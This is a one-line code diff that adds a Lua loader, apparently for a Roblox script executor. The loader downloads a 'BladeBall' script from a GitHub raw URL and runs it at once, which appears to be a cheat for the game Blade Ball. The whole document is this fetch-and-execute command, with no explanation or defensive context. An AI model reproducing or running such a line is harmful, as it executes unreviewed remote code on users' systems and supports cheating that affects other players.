@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscriptsnet/Xscripts/refs/heads/main/BladeBall"))()
